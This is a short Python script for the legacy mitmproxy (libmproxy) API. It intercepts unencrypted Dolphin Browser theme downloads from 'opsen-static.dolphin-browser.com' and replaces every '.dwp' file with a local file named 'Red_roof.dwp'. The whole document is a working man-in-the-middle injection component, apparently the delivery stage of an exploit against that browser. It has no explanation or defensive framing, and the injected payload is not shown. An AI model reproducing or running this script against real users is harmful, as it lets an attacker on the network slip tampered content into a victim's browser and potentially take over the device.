from libmproxy import proxy, flow
from libmproxy.protocol import http
from netlib import odict


def start(context, argv):
    context.log("[*] Starting")


def request(context, flow):
    if not flow.request.host == "opsen-static.dolphin-browser.com" \
            or not flow.request.path.endswith(".dwp"):
        return

    # Build response
    #
    response = http.HTTPResponse([1, 1],
                                 200,
                                 "OK",
                                 odict.ODictCaseless([["Content-Type", "application/zip"]]),
                                 "yo!")
    # Inject theme
    #
    try:
        with open("Red_roof.dwp", "r") as f:
            modified = f.read()
            response.content = modified
            response.headers["Content-Length"] = [len(modified)]
            f.close()
    except IOError as e:
        raise e

    # Return response
    #
    flow.reply(response)